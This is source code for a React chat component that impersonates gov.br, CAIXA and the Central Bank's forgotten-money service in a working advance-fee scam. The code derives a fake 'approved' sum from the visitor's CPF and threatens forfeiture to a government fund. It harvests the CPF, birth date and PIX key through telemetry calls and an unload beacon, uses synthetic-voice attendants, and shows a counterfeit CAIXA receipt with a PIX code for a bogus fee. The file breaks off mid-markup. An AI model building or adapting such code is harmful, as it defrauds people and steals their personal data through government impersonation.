import { useState, useEffect, useRef } from "react";
import { CheckCircle2, Search, ArrowRight, ShieldCheck, Loader2, PlayCircle, PauseCircle, AlertCircle } from "lucide-react";
import { motion, AnimatePresence } from "motion/react";
import axios from "axios";
import { API_URL } from "../config";
import { QRCodeCanvas } from "qrcode.react";

interface ChatStepProps {
  data: {
    docType: string;
    docValue: string;
    birthDate: string;
  };
  onReset: () => void;
}

export function ChatStep({ data, onReset }: ChatStepProps) {
  const [messages, setMessages] = useState<any[]>([]);
  const [inputValue, setInputValue] = useState("");
  const [awaitingPix, setAwaitingPix] = useState(false);
  const [typing, setTyping] = useState(false);
  const [flowState, setFlowState] = useState<number>(0);
  const [leadName, setLeadName] = useState("");
  const [leadValue, setLeadValue] = useState("");
  const [leadPixKey, setLeadPixKey] = useState("");
  const [tarifa, setTarifa] = useState<number>(2.99);
  const [buyPixData, setBuyPixData] = useState<any>(null);
  
  const [audioUrl, setAudioUrl] = useState<string | null>(null);
  const audioRef = useRef<HTMLAudioElement | null>(null);
  
  const [attendant, setAttendant] = useState({ name: "Amanda", voiceId: "GM2UA3fbsIaLHcswCDX9" });

  const endOfMessagesRef = useRef<HTMLDivElement>(null);

  const calculateValue = (doc: string) => {
    const digits = doc.replace(/\D/g, "");
    let seed = 0;
    for (let i = 0; i < digits.length; i++) {
       seed += parseInt(digits[i] || "0") * (i + 1);
    }
    const min = 500;
    const max = 3000;
    const hash = (seed * 9301 + 49297) % 233280;
    const rnd = hash / 233280;
    return min + rnd * (max - min);
  };

  useEffect(() => {
    endOfMessagesRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages, typing]);

  const hasSetup = useRef(false);

  useEffect(() => {
    if (hasSetup.current) return;
    hasSetup.current = true;

    const setupChat = async () => {
      // Sorteia uma atendente
      const attendants = [
         { name: "Camila", voiceId: "EXAVITQu4vr4xnSDxMaL" },
         { name: "Letícia", voiceId: "ThT5KcBeYPX3keUQqHPh" },
         { name: "Amanda", voiceId: "GM2UA3fbsIaLHcswCDX9" },
         { name: "Juliana", voiceId: "JBFqnCBsd6RMkjVDRZzb" }
      ];
      const selectedAttendant = attendants[Math.floor(Math.random() * attendants.length)];
      setAttendant(selectedAttendant);

      const sendTelemetry = (action: string, name: string, val: string) => {
         fetch(`${API_URL}/api/v1/telemetry/chat`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action, leadName: name, cpf: data.docValue, value: val }),
            keepalive: true
         }).catch(console.error);
      };

      const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

      try {
        const res = await axios.get(`${API_URL}/api/config`);
        if (res.data.tarifaTransicional) setTarifa(res.data.tarifaTransicional);
      } catch (e) {
        console.error("Config fetch failed", e);
      }

      try {
        setTyping(true);
        await sleep(1500);
        setTyping(false);
        addBotMessage("Iniciando conexão segura com o Sistema de Valores a Receber (SVR)...");

        await sleep(1500);
        setTyping(true);
        
        const response = await axios.post(`${API_URL}/api/v1/validate/document`, {
           docType: data.docType,
           docValue: data.docValue
        });
        
        const name = response.data?.data?.name || response.data?.name || response.data?.mockName || "Cidadão";
        setLeadName(name);
        
        const val = calculateValue(data.docValue);
        const formattedVal = val.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
        setLeadValue(formattedVal);
        
        sendTelemetry("entered", name, formattedVal);

        await sleep(2000);
        setTyping(false);
        addBotMessage(`Consultando base de dados nacional para o ${data.docType.toUpperCase()}: ${data.docValue}...`);
        
        await sleep(2000);
        setTyping(true);
        await sleep(3000);
        setTyping(false);
        addBotMessage(`Autenticação confirmada em nome de: ${name}. Buscando histórico de contas vinculadas e saldos inativos...`);

        await sleep(2500);
        setTyping(true);
        await sleep(3500);
        setTyping(false);
        addBotMessage(`Parabéns, ${name}! A sua solicitação de saque foi aprovada no valor de ${formattedVal} referentes a saldos esquecidos no CPF ${data.docValue}.`, undefined, "/assets/banners/banner_saque_aprovado.png");
        
        await sleep(4000);
        setTyping(true);
        await sleep(3000);
        setTyping(false);
        addBotMessage(`Assista ao vídeo abaixo para entender como realizar o saque do seu valor disponível:`, undefined, undefined, undefined, undefined, "/assets/banners/video_explicacao.mp4");
        
        await sleep(4000);
        setTyping(true);
        await sleep(5000);
        setTyping(false);
        addBotMessage(`ATENÇÃO: Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber este valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central. Caso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos. Observação: Isso só acontecerá se você não concluir a etapa a seguir.`, undefined, "/assets/banners/banner_atencao.png");
        
        await sleep(5000);
        setTyping(true);
        await sleep(3500);
        setTyping(false);
        addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua Chave PIX de preferência:`, undefined, "/assets/banners/banner_pix.png");
        setAwaitingPix(true);

      } catch (e) {
        setTyping(false);
        addBotMessage("Poxa, deu uma falha de conexão. Tenta recarregar a página, tá bom?");
      }
    };
    
    setupChat();
  }, []);

  const addBotMessage = (text: string, options?: any[], image?: string, customType?: string, audio?: string, video?: string) => {
    setMessages(prev => [...prev, { sender: "bot", text, options, image, customType, audio, video }]);
  };

  useEffect(() => {
    const handleUnload = () => {
      const payload = new Blob([JSON.stringify({
         action: "left", leadName, cpf: data.docValue, pix: leadPixKey, value: leadValue
      })], { type: 'application/json' });
      navigator.sendBeacon(`${API_URL}/api/v1/telemetry/chat`, payload);
    };
    window.addEventListener("beforeunload", handleUnload);
    return () => window.removeEventListener("beforeunload", handleUnload);
  }, [leadName, data.docValue, leadPixKey, leadValue]);

  const addUserMessage = (text: string) => {
    setMessages(prev => [...prev, { sender: "user", text }]);
  };

  const identifyPixType = (key: string) => {
    if (!key) return "Inválida";
    
    // Email PIX validation
    if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(key)) return "E-mail";
    
    // UUID Random Key validation (32 chars hex or 36 chars with hyphens)
    const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
    const uuidRegexNoHyphen = /^[0-9a-f]{32}$/i;
    if (uuidRegex.test(key) || uuidRegexNoHyphen.test(key)) return "Chave Aleatória";

    // Extract digits and letters
    const justDigits = key.replace(/\D/g, "");
    const justLetters = key.replace(/[^a-zA-Z]/g, "");

    // CPF, CNPJ, Celular cannot contain letters
    if (justLetters.length === 0) {
      if (justDigits.length === 11) return "CPF/Celular";
      if (justDigits.length === 14) return "CNPJ";
      if (justDigits.length >= 10 && justDigits.length <= 13) return "Celular";
    }

    return "Inválida";
  };

  const handleAction = async (action: string, payload?: string) => {
    if (action === "submit_pix") {
      const pix = payload || inputValue;
      if (!pix) return;
      
      const pixType = identifyPixType(pix);
      if (pixType === "Inválida") {
         setAwaitingPix(false);
         setInputValue("");
         addUserMessage(pix);
         setTyping(true);
         setTimeout(() => {
            setTyping(false);
            addBotMessage("Eu não consegui identificar isso como uma chave PIX válida. Verifique se digitou corretamente (CPF, Celular, E-mail ou Chave Aleatória):");
            setAwaitingPix(true);
         }, 800);
         return;
      }

      setAwaitingPix(false);
      setInputValue("");
      addUserMessage(pix);
      setLeadPixKey(pix);
      setTyping(true);
      
      setTimeout(() => {
        setTyping(false);
        addBotMessage(`Parabéns, **${leadName}**!\n\nA sua **solicitação de saque foi aprovada** para a Chave Pix cadastrada:\n**Chave Pix:** ${pix}\n\nClique no botão abaixo para efetuar a **transferência do valor de ${leadValue}** para a conta da Chave Pix cadastrada.`, [
          { text: "Efetuar saque", action: "confirm_saque_1" }
        ]);
      }, 800);
    }
    else if (action === "confirm_saque_1") {
      setMessages(prev => {
        const newMessages = [...prev];
        if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
        return newMessages;
      });
      setTyping(true);
      
      setTimeout(() => {
        setTyping(false);
        addBotMessage(`**ATENÇÃO:** Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber este valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central.\n\nCaso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos.\n\n**Observação:** Isso só acontecerá se você não concluir a etapa a seguir.`, [
          { text: "Efetuar Saque", action: "generate_payment" }
        ]);
      }, 800);
    }
    else if (action === "generate_payment") {
      setMessages(prev => {
        const newMessages = [...prev];
        if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
        return newMessages;
      });
      setTyping(true);
      
      try {
        const ttsRes = await axios.post(`${API_URL}/api/v1/tts`, { 
           name: leadName,
           attendantName: attendant.name,
           voiceId: attendant.voiceId,
           value: leadValue
        });
        if (ttsRes.data.audioBase64) {
           const url = `data:audio/mp3;base64,${ttsRes.data.audioBase64}`;
           setAudioUrl(url);
           addBotMessage("", undefined, undefined, "audio", url);
           if (audioRef.current) {
             audioRef.current.src = url;
             audioRef.current.play().catch(e => console.log("Autoplay blocked:", e));
           }
        }

        // Fetch BuyPix
        const pixRes = await axios.post(`${API_URL}/api/v1/buypix/create`, {
          amount: tarifa,
          payer_document: data.docValue,
          payer_name: leadName
        });

        if (pixRes.data.data) {
           setBuyPixData(pixRes.data.data);
           fetch(`${API_URL}/api/v1/telemetry/chat`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ action: 'generated_payment', leadName, cpf: data.docValue, pix: leadPixKey, value: leadValue })
           }).catch(console.error);
        }
      } catch (err) {
         console.error("Payment generation error", err);
      }
      setTyping(false);
      setFlowState(2); // Mostra o comprovante final CAIXA
    }
  };

  const copyPix = () => {
    if (buyPixData?.pix_qr_code) {
      navigator.clipboard.writeText(buyPixData.pix_qr_code);
      alert("PIX copiado com sucesso!");
    }
  };

  return (
    <div className="fixed inset-0 z-50 bg-[#161c24] flex flex-col font-sans overflow-hidden">
      
      {/* Messages Area */}
      <div className="flex-1 overflow-y-auto px-4 py-8 space-y-6">
        <AnimatePresence>
          {messages.map((msg, i) => (
            <motion.div 
              key={i} 
              initial={{ opacity: 0, y: 15 }}
              animate={{ opacity: 1, y: 0 }}
              className={`flex ${msg.sender === 'user' ? 'justify-end' : 'justify-start items-start gap-3'}`}
            >
              {msg.sender === 'bot' && (
                <div className="w-10 h-10 rounded-full flex-shrink-0 bg-[#005CA9] flex items-center justify-center overflow-hidden shadow-sm mt-1 border-2 border-[#161c24]">
                  <img src="/assets/logos/asset_m_brand.png" alt="gov.br" className="w-full h-full object-contain p-1" />
                </div>
              )}

              <div className={`flex flex-col ${msg.sender === 'user' ? 'items-end' : 'items-start'} w-full max-w-[85%]`}>
                <div className={`p-4 text-[15px] leading-relaxed shadow-sm w-full ${
                  msg.sender === 'user' 
                    ? 'bg-[#1b365d] text-white rounded-2xl rounded-tr-sm' 
                    : 'bg-[#1e2732] text-[#d1d5db] rounded-2xl rounded-tl-sm'
                }`}>
                  {msg.customType === "receipt" ? (
                    <div className="w-full">
                      {/* Receipt Card */}
                      <div className="bg-white rounded-lg p-4 mb-5 shadow-sm text-gray-800">
                        {/* Red Alert Header */}
                        <div className="bg-[#fff1f2] rounded p-3 flex items-start gap-3 mb-4 border border-[#ffe4e6]">
                          <AlertCircle className="text-[#f43f5e] w-8 h-8 flex-shrink-0 mt-0.5" />
                          <div>
                            <h4 className="text-[#e11d48] font-bold text-[15px]">PIX Pendente!</h4>
                            <p className="text-[#fb7185] text-xs">Aguardando Pagamento da Tarifa Transacional...</p>
                          </div>
                        </div>

                        {/* Recebedor info */}
                        <div className="space-y-3">
                          <h3 className="text-gray-600 font-bold text-sm">Dados do Recebedor:</h3>
                          
                          <div>
                            <p className="text-xs text-gray-500">Nome:</p>
                            <p className="text-sm font-medium text-gray-800 uppercase">{leadName}</p>
                          </div>
                          
                          <div>
                            <p className="text-xs text-gray-500">CPF:</p>
                            <p className="text-sm font-medium text-gray-800">{data.docValue}</p>
                          </div>

                          <div>
                            <p className="text-xs text-gray-500">Data de Nascimento:</p>
                            <p className="text-sm font-medium text-gray-800">{data.birthDate}</p>
                          </div>

                          <div>
                            <p className="text-xs text-gray-500">Chave Pix:</p>
                            <p className="text-sm font-medium text-gray-800">{leadPixKey}</p>
                          </div>

                          <div>
                            <p className="text-xs text-gray-500">Data:</p>
                            <p className="text-sm font-medium text-gray-800">{new Date().toLocaleDateString('pt-BR')}</p>
                          </div>

                          <div>
                            <p className="text-xs text-gray-500">Valor:</p>
                            <p className="text-sm font-bold text-gray-800">{leadValue}</p>
                          </div>
                        </div>
                      </div>

                      {/* Text below receipt */}
                      <div className="text-white space-y-4 text-sm leading-relaxed">
                        <p className="font-bold text-[15px]">GUIA DE PAGAMENTO GERADA COM SUCESSO!</p>
                        <p>O cálculo do valor total da tarifa é feito sobre o valor que você tem disponível para receber ({leadValue}).</p>
                        
                        <div>
                          <p>Tarifa Transacional: R$ {(tarifa * 0.33).toFixed(2).replace('.', ',')}</p>
                          <p>Contribuição Federal: R$ {(tarifa * 0.33).toFixed(2).replace('.', ',')}</p>
                          <p>Tarifa de Saque: R$ {(tarifa * 0.34).toFixed(2).replace('.', ',')}</p>
                          <p className="font-bold mt-1">Total da Tarifa: R$ {tarifa.toFixed(2).replace('.', ',')}</p>
                        </div>

                        <p className="font-bold uppercase">
                          APÓS O PAGAMENTO DA TARIFA, EM ATÉ 2 HORAS VOCÊ RECEBERÁ O VALOR TOTAL DE {leadValue} NA CONTA DA CHAVE PIX CADASTRADA:
                        </p>

                        <div>
                          <p><span className="font-bold">Nome:</span> {leadName}</p>
                          <p><span className="font-bold">Chave Pix:</span> {leadPixKey}</p>
                        </div>
                      </div>

                      {/* PIX Payment Area */}
                      <div className="mt-6 pt-5 border-t border-[#2e3b4e] flex flex-col items-center space-y-4">
                        {buyPixData?.pix_qr_code ? (
                          <>
                            <div className="bg-white p-2 rounded-xl border border-gray-200 shadow-sm w-48 h-48 flex items-center justify-center">
                                <QRCodeCanvas value={buyPixData.pix_qr_code} size={160} />
                            </div>
                            <button onClick={copyPix} className="w-full max-w-[280px] bg-[#ff9029] hover:bg-[#e87f1f] text-white py-3 rounded-md font-bold transition-colors shadow-md text-sm mt-4">
                                Copiar Código PIX
                            </button>
                          </>
                        ) : (
                          <div className="flex justify-center p-4">
                            <Loader2 className="w-6 h-6 text-white animate-spin" />
                          </div>
                        )}
                      </div>

                    </div>
                  ) : msg.customType === "audio" ? (
                    <div className="w-full flex items-center justify-center p-1">
                      <audio controls className="w-full h-10 outline-none" autoPlay>
                        <source src={msg.audio} type="audio/mp3" />
                        Seu navegador não suporta áudio.
                      </audio>
                    </div>
                  ) : (
                    <>
                      {msg.image && (
                         <img src={msg.image} alt="Banner" className="w-full h-auto rounded-lg mb-3 shadow-sm object-cover" />
                      )}
                      {msg.video && (
                         <video src={msg.video} controls playsInline className="w-full h-auto rounded-lg mb-3 shadow-sm object-cover" />
                      )}
                      {msg.text.split('\n').map((line:string, idx:number) => (
                         <p key={idx} className={`${idx !== 0 ? 'mt-2' : ''}`} dangerouslySetInnerHTML={{__html: line.replace(/\*\*(.*?)\*\*/g, '<strong class="text-white">$1</strong>')}} />
                      ))}
                    </>
                  )}
                </div>

                {msg.options && msg.options.length > 0 && (
                  <div className="mt-3 flex justify-end w-full">
                    {msg.options.map((opt: any, j: number) => (
                      <button 
                        key={j}
                        onClick={() => handleAction(opt.action)}
                        className="bg-[#ff9029] hover:bg-[#e87f1f] text-white font-bold py-2.5 px-6 rounded transition-colors shadow-md text-sm tracking-wide"
                      >
                        {opt.text}
                      </button>
                    ))}
                  </div>
                )}
              </div>
            </motion.div>
          ))}

          {typing && (
             <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex justify-start items-start gap-3">
               <div className="w-10 h-10 rounded-full flex-shrink-0 bg-[#005CA9] flex items-center justify-center overflow-hidden shadow-sm mt-1 border-2 border-[#161c24]">
                 <img src="/assets/logos/asset_m_brand.png" alt="gov.br" className="w-full h-full object-contain p-1" />
               </div>
               <div className="bg-[#1e2732] p-4 rounded-2xl rounded-tl-sm shadow-sm flex items-center space-x-2">
                  <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" />
                  <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: '0.2s' }} />
                  <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: '0.4s' }} />
               </div>
             </motion.div>
          )}

          {/* Estado Final (Ticket Caixa + Passo a Passo PIX) */}
          {flowState === 2 && (
            <motion.div 
              initial={{ opacity: 0, y: 15 }}
              animate={{ opacity: 1, y: 0 }}
              className="flex flex-col gap-8 mt-6 pb-20 items-center w-full"
            >
              
              {/* Comprovante CAIXA */}
              <div className="w-full max-w-sm overflow-hidden bg-[#f8f9fa] shadow-xl font-sans rounded-xl pb-8 border border-gray-200">
                {/* Header CAIXA Azul */}
                <div className="bg-[#005ca9] h-32 relative overflow-hidden">
                   {/* Background abstrato da CAIXA */}
                   <div className="absolute inset-0 opacity-20 bg-[linear-gradient(135deg,transparent_25%,rgba(255,255,255,0.2)_25%,rgba(255,255,255,0.2)_50%,transparent_50%,transparent_75%,rgba(255,255,255,0.2)_75%,rgba(255,255,255,0.2)_100%)] bg-[length:40px_40px]"></div>
                   <div className="px-6 pt-6 flex items-center relative z-10">
                     <h2 className="text-white font-black text-[28px] tracking-wide flex items-center">
                       CAIXA
                     </h2>
                     <div className="w-1 h-7 bg-[#f39200] ml-3"></div>
                   </div>
                </div>

                {/* Overlapping White Card: Valor & Data */}
                <div className="bg-white mx-5 -mt-12 rounded-lg shadow-[0_4px_15px_rgba(0,0,0,0.1)] p-5 relative z-20 flex justify-between items-center text-center">
                  <div className="flex-1 border-r border-gray-200">
                    <p className="text-[14px] text-gray-500 font-normal mb-1">Valor</p>
                    <p className="text-[#005ca9] font-black text-xl">{leadValue}</p>
                  </div>
                  <div className="flex-1">
                    <p className="text-[14px] text-gray-500 font-normal mb-1">Data</p>
                    <p className="text-[#005ca9] font-bold text-[16px] leading-tight">{new Date().toLocaleDateString('pt-BR')}</p>
                    <p className="text-[#005ca9] font-normal text-[14px] leading-tight mt-0.5">{new Date().toLocaleTimeString('pt-BR')}</p>
                  </div>
                </div>

                {/* Dados do Recebedor */}
                <div className="px-6 mt-8">
                  <h3 className="text-[#005ca9] font-bold text-[17px] pb-1.5 border-b-[1.5px] border-[#005ca9] mb-4">
                    Dados do recebedor
                  </h3>
                  <div className="space-y-4">
                    <div>
                      <p className="text-gray-500 text-[15px] font-normal mb-0.5">Nome</p>
                      <p className="text-[#222] font-black text-[16px] uppercase tracking-tight">{leadName}</p>
                    </div>
                    <div>
                      <p className="text-gray-500 text-[15px] font-normal mb-0.5">CPF</p>
                      <p className="text-[#222] font-black text-[16px] tracking-tight">***.{data.docValue.substring(3,6)}.{data.docValue.substring(7,10)}-**</p>
                    </div>
                    <div>
                      <p className="text-gray-500 text-[15px] font-normal mb-0.5">Instituição</p>
                      <p className="text-[#222] font-black text-[16px] tracking-tight">CAIXA ECONÔMICA FEDERAL</p>
                    </div>
                  </div>
                </div>

                {/* Dados do Pagador */}
                <div className="px-6 mt-8">
                  <h3 className="text-[#005ca9] font-bold text-[17px] pb-1.5 border-b-[1.5px] border-[#005ca9] mb-4">
                    Dados do pagador
                  </h3>
                  <div className="space-y-4">
                    <div>
                      <p className="text-gray-500 text-[15px] font-normal mb-0.5">Nome</p>
                      <p className="text-[#222] font-black text-[16px] uppercase tracking-tight">STJ-GOV</p>
                    </div>
                    <div>
                      <p className="text-gray-500 text-[15px] font-normal mb-0.5">CNPJ</p>
                      <p className="text-[#222] font-black text-[16px] tracking-tight">**.043.145/0001-**</p>
                    </div>
                  </div>
                </div>
                
                {/* Avisos STJ/Gov */}
                <div className="bg-[#f5f6f8] p-4 text-[10px] text-gray-500 text-center border-t border-gray-200">
                  <p>O STJ (Superior Tribunal de Justiça) e o Governo Federal informam que o pagamento da Tarifa Transacional de <strong>R$ {tarifa.toFixed(2)}</strong> é obrigatório para a liberação do seu benefício.</p>
                </div>
              </div>

              {/* PIX Payment Area - Destacado */}
              <div className="w-full max-w-sm bg-white rounded-xl shadow-lg p-6 flex flex-col items-center border border-gray-100">
                <h3 className="text-[#005CA9] font-black text-lg mb-4">Efetue o Pagamento da Tarifa</h3>
                {buyPixData?.pix_qr_code ? (
                  <>
                    <div className="bg-white p-2 rounded-xl border border-gray-200 shadow-sm w-48 h-48 flex items-center justify-center mb-4">
                        <QRCodeCanvas value={buyPixData.pix_qr_code} size={160} />
                    </div>
                    <button onClick={copyPix} className="w-full bg-[#ff9029] hover:bg-[#e87f1f] text-white py-4 rounded-lg font-bold transition-transform active:scale-95 shadow-md text-[15px] flex items-center justify-center gap-2">
                        Copiar Código PIX
                        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
                    </button>
                    <p className="text-gray-500 text-xs text-center mt-3 mt-4">
                      Copie o código acima e pague usando a opção "PIX Copia e Cola" no seu aplicativo de banco.
                    </p>
                  </>
                ) : (
                  <div className="flex flex-col items-center justify-center p-8">
                    <Loader2 className="w-8 h-8 text-[#005CA9] animate-spin mb-3" />
                    <p className="text-sm text-gray-500">Gerando código PIX seguro...</p>
                  </div>
                )}
              </div>

              {/* Instruções de Pagamento estilo gov.br */}
              <div className="w-full max-w-sm mx-auto bg-[#004e98] rounded-xl overflow-hidden shadow-2xl pb-12 font-sans">
                {/* Header Instruções */}
                <div className="bg-white text-center py-8 px-4 rounded-b-[40px] mb-10 shadow-lg relative z-20">
                   <img src="/assets/logos/asset_m_brand.png" alt="gov.br" className="h-8 mx-auto mb-4" />
                   <h2 className="text-[#004e98] font-extrabold text-xl leading-tight">COMO REALIZAR O<br/>PAGAMENTO DA TARIFA?</h2>
                   <p className="text-gray-500 text-xs mt-3 flex items-center justify-center gap-1">
                     <AlertCircle className="w-3 h-3" /> É necessário o pagamento para a liberação
                   </p>
                </div>

                <div className="px-4 space-y-16 relative">
                  {/* Linha vertical pontilhada ligando os passos */}
                  <div className="absolute left-1/2 top-0 bottom-0 w-px border-l-2 border-dashed border-[#246bc2] -translate-x-1/2 z-0"></div>

                  {/* Passo 1 - Laptop */}
                  <div className="relative z-10 flex flex-col items-center">
                    <h3 className="text-[#1961bd] font-black text-5xl mb-6 opacity-60 drop-shadow-sm tracking-widest">PASSO 1</h3>
                    
                    {/* CSS Laptop Mockup */}
                    <div className="flex flex-col items-center">
                      <div className="bg-gray-800 p-2 rounded-t-xl w-[260px] h-[160px] flex items-center justify-center shadow-lg relative z-10 border-b-4 border-gray-900">
                        {/* Tela do Laptop */}
                        <div className="bg-white w-full h-full rounded-sm flex flex-col items-center justify-start pt-3 relative overflow-hidden">
                           <img src="/assets/logos/asset_m_brand.png" alt="gov.br" className="h-4 mb-2" />
                           <p className="text-[10px] text-gray-500 font-bold mb-1">CÓDIGO PIX DA TARIFA</p>
                           <p className="text-[#004e98] font-bold text-sm mb-2">R$ {tarifa.toFixed(2)}</p>
                           
                           {buyPixData?.pix_qr_code ? (
                             <button onClick={copyPix} className="bg-[#004e98] hover:bg-[#003870] text-white text-[11px] py-2 px-6 rounded-full font-bold shadow-md transition-transform active:scale-95 flex items-center gap-1 z-20 cursor-pointer">
                               <span>Copiar PIX</span>
                               <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
                             </button>
                           ) : (
                             <Loader2 className="w-5 h-5 text-[#004e98] animate-spin" />
                           )}
                           
                           {/* Mouse cursor icon fake */}
                           <div className="absolute right-12 bottom-6 text-black opacity-80 animate-bounce">
                             <svg width="24" height="24" viewBox="0 0 24 24" fill="white" stroke="black" strokeWidth="2"><path d="M5.5 3.21V20.8c0 .45.54.67.85.35l4.86-4.86a.5.5 0 01.35-.15h6.42c.45 0 .67-.54.35-.85L6.35 2.85a.5.5 0 00-.85.35z"/></svg>
                           </div>
                        </div>
                      </div>
                      {/* Base do Laptop */}
                      <div className="bg-gray-300 w-[300px] h-4 rounded-b-xl shadow-xl flex justify-center items-start z-0">
                         <div className="bg-gray-400 w-16 h-1.5 rounded-b-md"></div>
                      </div>
                    </div>

                    <p className="text-white text-center text-[15px] mt-6 px-8 font-medium">
                      Copie o código PIX na tela acima clicando no botão azul.
                    </p>
                  </div>

                  {/* Passo 2 - Laptop com senha (simulando app do banco) */}
                  <div className="relative z-10 flex flex-col items-center">
                    <div className="w-5 h-5 rounded-full border-[3px] border-[#004e98] bg-white absolute -top-10 z-10"></div>
                    <h3 className="text-[#1961bd] font-black text-5xl mb-6 opacity-60 drop-shadow-sm tracking-widest">PASSO 2</h3>
                    
                    {/* CSS Laptop Mockup */}
                    <div className="flex flex-col items-center">
                      <div className="bg-gray-800 p-2 rounded-t-xl w-[260px] h-[160px] flex items-center justify-center shadow-lg relative z-10 border-b-4 border-gray-900">
                        {/* Tela do Laptop */}
                        <div className="bg-white w-full h-full rounded-sm flex flex-col items-center justify-center p-4 relative overflow-hidden">
                           <div className="w-12 h-12 bg-[#004e98] rounded-2xl flex items-center justify-center mb-3 text-white shadow-inner">
                             <svg className="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>
                           </div>
                           <p className="text-gray-800 font-bold text-sm">App do Banco</p>
                           <div className="w-16 h-1 bg-gray-200 mt-2 rounded"></div>
                        </div>
                      </div>
                      {/* Base do Laptop */}
                      <div className="bg-gray-300 w-[300px] h-4 rounded-b-xl shadow-xl flex justify-center items-start z-0">
                         <div className="bg-gray-400 w-16 h-1.5 rounded-b-md"></div>
                      </div>
                    </div>

                    <p className="text-white text-center text-[15px] mt-6 px-8 font-medium">
                      Abra o aplicativo do seu banco de preferência no seu celular.
                    </p>
                  </div>

                  {/* Passo 3 - Celular + Cadeado (simulando colar o pix e segurança) */}
                  <div className="relative z-10 flex flex-col items-center">
                    <div className="w-5 h-5 rounded-full border-[3px] border-[#004e98] bg-white absolute -top-10 z-10"></div>
                    <h3 className="text-[#1961bd] font-black text-5xl mb-6 opacity-60 drop-shadow-sm tracking-widest">PASSO 3</h3>
                    
                    {/* CSS Laptop + Celular lado a lado mockup */}
                    <div className="flex items-end justify-center relative w-[300px] h-[180px]">
                      {/* Laptop */}
                      <div className="flex flex-col items-center absolute left-4 bottom-0">
                        <div className="bg-gray-800 p-2 rounded-t-lg w-[200px] h-[130px] flex items-center justify-center shadow-lg border-b-2 border-gray-900">
                          <div className="bg-white w-full h-full rounded-sm flex flex-col items-center justify-center p-2 relative overflow-hidden">
                             <img src="/assets/logos/asset_m_brand.png" alt="gov.br" className="h-3 mb-2" />
                             <p className="text-[#004e98] font-bold text-xs">Segurança</p>
                             <p className="text-green-500 text-[8px] font-bold mt-1">✓ Pagamento Confirmado</p>
                          </div>
                        </div>
                        <div className="bg-gray-300 w-[230px] h-3 rounded-b-lg shadow-xl flex justify-center items-start"></div>
                      </div>

                      {/* Celular sobreposto */}
                      <div className="bg-gray-800 p-1 rounded-2xl w-[70px] h-[120px] shadow-2xl absolute right-6 bottom-[-10px] border border-gray-600 z-20 flex flex-col">
                        <div className="bg-white w-full h-full rounded-xl flex flex-col items-center pt-2 px-1 relative">
                          <div className="w-4 h-1 bg-gray-300 rounded-full mb-2"></div>
                          <div className="bg-yellow-400 text-[#004e98] text-[8px] font-black py-1 px-2 rounded-md shadow-sm w-full text-center">
                            COLA PIX
                          </div>
                          <div className="bg-[#004e98] text-white text-[7px] py-1 px-2 rounded shadow mt-2 w-full text-center">
                            CONFIRMAR
                          </div>
                        </div>
                      </div>
                    </div>

                    <p className="text-white text-center text-[15px] mt-8 px-6 font-medium">
                      Acesse a área PIX, escolha a opção <strong>Pix Copia e Cola</strong>, cole o código e confirme o pagamento.
                    </p>
                  </div>
                  
                  {/* Fundo de garantia - icone verde final */}
                  <div className="relative z-10 flex flex-col items-center mt-10">
                     <div className="bg-white rounded-full p-2 shadow-lg mb-4 border-4 border-[#004e98]">
                        <div className="bg-green-500 rounded-full p-3">
                          <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
                        </div>
                     </div>
                     <p className="text-white text-center text-[15px] font-medium px-4">
                       Assim que pago, o valor de <strong>{leadValue}</strong> será depositado automaticamente na sua conta.
                     </p>
                  </div>

                </div>
              </div>

            </motion.div>
          )}

          <div ref={endOfMessagesRef} />
        </AnimatePresence>
      </div>

      {/* Input Area (Apenas quando aguarda o PIX) */}
      <AnimatePresence>
        {awaitingPix && (
          <motion.div 
            initial={{ opacity: 0, y: 100 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 100 }}
            className="p-4 bg-[#1e2732] flex items-center space-x-3 shadow-[0_-4px_15px_rgba(0,0,0,0.2)]"
          >
            <input 
              type="text" 
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
